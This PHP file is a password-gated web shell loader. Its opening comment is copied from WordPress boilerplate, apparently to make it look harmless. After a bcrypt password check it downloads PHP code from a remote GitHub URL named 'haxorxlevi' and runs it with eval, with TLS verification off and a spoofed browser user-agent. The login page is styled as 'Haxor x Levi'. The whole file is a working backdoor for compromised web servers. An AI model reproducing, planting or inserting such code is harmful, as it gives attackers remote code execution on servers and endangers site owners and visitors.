<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['SAP'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    
    $hashed_password = '$2y$12$6qkA6XrW8ccqc6GZ4cxSXeBOlsKslVOUrVdkFjKtCFeP5OZyCuMUu'; 
    
    if (password_verify($entered_password, $hashed_password)) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['SAP'] = 'janco'; 
    } else {
        echo "MAU APA AJG!!";
    }
}


if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/HaSec-alt/gil-sub/main/a/b/c/d/haxorxlevi');
    eval('?>' . $a);
} else {
    ?>

<!DOCTYPE html>
<html>
<head>
    <title>Haxor x Levi</title>
</head>
<body>
  <style>
    html {
      height: 100%; 
      margin: 0; 
    }
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: rgb(255, 255, 255); 
      background: url('https://haxor.lol/haxor-research.jpg') no-repeat center center fixed;
      background-size: cover; 
      font-family: Arial, sans-serif;
    }
  
  form {
  background: transparent;
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  }
  
  label {
  display: block;
  margin-bottom: 10px;
  }
  
input {
width: 100%;
padding: 10px;
margin-bottom: 15px;
box-sizing: border-box;
border: 2px solid #f00;
border-radius: 5px;
background-color: transparent;
color: #333;
text-align: center;
  }
  
  input[type="submit"] {
  color: white;
  cursor: pointer;
  }
  
  input[type="submit"]:hover {
  background-color: black;
  }
  input[type="password"]:hover {
  background-color: white;
  }
  </style>
  </head>
  <body>
  <form method="POST" action="">
  <input type="password" id="password" name="password">
  <input type="submit" value="Submit">
  </form>
  </body>
  </html>

  <?php
}
?>
